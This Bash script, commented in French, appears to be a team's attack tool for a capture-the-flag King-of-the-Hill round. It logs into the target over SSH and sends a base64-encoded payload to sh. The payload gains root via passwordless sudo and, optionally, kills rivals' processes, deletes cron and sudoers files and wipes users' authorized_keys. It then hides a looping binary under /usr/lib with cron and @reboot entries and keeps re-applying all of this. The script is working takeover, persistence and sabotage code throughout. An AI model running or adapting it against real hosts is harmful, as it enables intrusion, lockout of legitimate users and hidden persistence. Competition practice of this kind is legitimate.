#!/usr/bin/env bash
# =============================================================================
# NCTF26 FINALE — KoTH "SSH hill" : prise + persistance on-box + re-assertion.
#
# Sert quand la colline est une machine (ssh -p <port> player@<ip>) et que le score
# = un fichier "king" lu par le scorer. Adapte du kit prequal (citadel_takeover.sh),
# mais : AUCUN secret en dur, payload base64 (zéro enfer de quoting), et surtout une
# BOUCLE DE RE-ASSERTION locale : si le conteneur est reset (persistance on-box
# effacee), on repose le jeton automatiquement toutes les N secondes.
#
#   bash koth_ssh_takeover.sh            # boucle de tenue (detachee conseillee)
#   bash koth_ssh_takeover.sh --once     # une prise, puis sortie
#   bash koth_ssh_takeover.sh --purge    # en plus : neutralise la persistance rivale
#
# PARAMETRES (env, ou fichier hill.env) :
#   KOTH_SSH_HOST (requis)  KOTH_SSH_PORT (def 22)  KOTH_SSH_USER (def player)
#   KOTH_SSH_PASS (ou cle SSH par defaut)  KOTH_TOKEN (requis)
#   KING_FILE (def /koth/king)  KING_FILE2 (opt, ex /king/king.txt)
#   KOTH_REASSERT_PERIOD (def 20s)  KOTH_HOLD_BIN (def /usr/lib/.koth-hold)
#
# REGLES : box de la colline IN-SCOPE uniquement. Pas de DoS, pas d'attaque des
# autres equipes hors de cette box, pas de sortie de périmètre.
# =============================================================================
set -u
cd "$(dirname "$0")"

CONF="${KOTH_CONF:-hill.env}"
[ -f "$CONF" ] && { set -a; . "$CONF"; set +a; }

: "${KOTH_SSH_HOST:?definir KOTH_SSH_HOST}"
: "${KOTH_TOKEN:?definir KOTH_TOKEN = notre jeton dequipe}"
PORT="${KOTH_SSH_PORT:-22}"
USER_="${KOTH_SSH_USER:-player}"
PASS="${KOTH_SSH_PASS:-}"
KING_FILE="${KING_FILE:-/koth/king}"
KING_FILE2="${KING_FILE2:-}"
HOLD_BIN="${KOTH_HOLD_BIN:-/usr/lib/.koth-hold}"
REASSERT="${KOTH_REASSERT_PERIOD:-20}"
ONCE=0
PURGE=0
case "${1:-}" in
  --once)  ONCE=1 ;;
  --purge) PURGE=1 ;;
  --print-payload) PRINT_PAYLOAD=1 ;;
  -h|--help) sed -n '2,24p' "$0"; exit 0 ;;
esac
[ "${2:-}" = "--purge" ] && PURGE=1

SSH_OPTS=(-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null
          -o ConnectTimeout=10 -o NumberOfPasswordPrompts=1 -p "$PORT")
if [ -n "$PASS" ]; then
  command -v sshpass >/dev/null 2>&1 || { echo "[!] sshpass manquant : sudo apt install -y sshpass"; exit 1; }
  ssh_run() { sshpass -p "$PASS" ssh "${SSH_OPTS[@]}" "$USER_@$KOTH_SSH_HOST" "$1"; }
else
  ssh_run() { ssh "${SSH_OPTS[@]}" "$USER_@$KOTH_SSH_HOST" "$1"; }
fi

log() { printf '[%s] %s\n' "$(date +%H:%M:%S)" "$*" | tee -a ssh_koth.log; }

# --- payload distant : root -> (purge) -> jeton -> persistance -> verif --------
build_payload() {
cat <<REMOTE
set -u
T='$KOTH_TOKEN'; F='$KING_FILE'; F2='$KING_FILE2'; H='$HOLD_BIN'; P='$PURGE'
if [ "\$(id -u)" = "0" ]; then RUN(){ sh -c "\$1"; }; echo "[+] root direct"
elif sudo -n /usr/bin/env true 2>/dev/null; then RUN(){ sudo -n /usr/bin/env sh -c "\$1"; }; echo "[+] root via sudo env"
elif sudo -n true 2>/dev/null; then RUN(){ sudo -n sh -c "\$1"; }; echo "[+] root via sudo"
else RUN(){ sh -c "\$1"; }; echo "[i] sans root (portee limitee)"; fi

if [ "\$P" = "1" ]; then
  echo "[*] purge persistance rivale"
  RUN 'pkill -9 -f "koth-hold|king-hold|\.koth|king\.sh" 2>/dev/null; \
       rm -f /etc/cron.d/koth* /etc/cron.d/king* /etc/sudoers.d/90-* 2>/dev/null; \
       : > /home/*/.ssh/authorized_keys 2>/dev/null; true'
fi

RUN "cat > '\$H' <<'EOS'
#!/bin/sh
T='\$T'; F='\$F'; F2='\$F2'
exec 9>/tmp/.koth-hold.lock
flock -n 9 2>/dev/null || exit 0
while :; do
  [ \"\$(cat \"\$F\" 2>/dev/null)\" != \"\$T\" ] && printf '%s\n' \"\$T\" > \"\$F\" 2>/dev/null
  [ -n \"\$F2\" ] && printf '%s\n' \"\$T\" > \"\$F2\" 2>/dev/null
  sleep 0.5
done
EOS
chmod 755 '\$H'"

RUN "printf '%s\n' '* * * * * root /bin/sh \$H' '@reboot root /bin/sh \$H' > /etc/cron.d/koth-hold 2>/dev/null; chmod 644 /etc/cron.d/koth-hold 2>/dev/null; true"
RUN "printf '%s\n' '\$T' > '\$F' 2>/dev/null; [ -n '\$F2' ] && printf '%s\n' '\$T' > '\$F2' 2>/dev/null; true"
RUN "setsid /bin/sh '\$H' >/dev/null 2>&1 &"
sleep 0.4
K=\$(RUN "cat '\$F' 2>/dev/null")
HP=\$(RUN "pgrep -f '\$H' | head -1")
echo "[=] king=\$K"
echo "[=] hold_pid=\$HP"
REMOTE
}

assert_once() {
  local payload b64 out
  payload="$(build_payload)"
  b64="$(printf '%s' "$payload" | base64 -w0)"
  out="$(ssh_run "echo $b64 | base64 -d | sh" 2>&1)" || true
  printf '%s\n' "$out" | tee -a ssh_koth.log
  if printf '%s' "$out" | grep -q '^\[=\] king='; then
    local king; king=$(printf '%s' "$out" | sed -n 's/^\[=\] king=//p' | head -1)
    if [ "$king" = "$KOTH_TOKEN" ]; then return 0; fi
    log "[!] king lu = '$king' != notre jeton"
    return 1
  fi
  return 1
}

if [ "${PRINT_PAYLOAD:-0}" = "1" ]; then build_payload; exit 0; fi

log "colline SSH ${USER_}@${KOTH_SSH_HOST}:${PORT} | king=${KING_FILE}${KING_FILE2:+ + $KING_FILE2} | purge=$PURGE"
if assert_once; then log "[+] jeton en place"; else log "[!] prise incomplete (voir ci-dessus)"; fi
if [ "$ONCE" = "1" ]; then exit 0; fi

log "re-assertion toutes les ${REASSERT}s (Ctrl+C pour arreter) — survit aux resets"
trap 'log "arret demande"; exit 0' INT TERM
fails=0
while :; do
  sleep "$REASSERT"
  if assert_once >/dev/null 2>&1; then
    fails=0; log "[+] re-assertion OK (king=$KOTH_TOKEN)"
  else
    fails=$((fails+1)); log "[!] re-assertion KO (#$fails) — reset en cours ? retry"
  fi
done
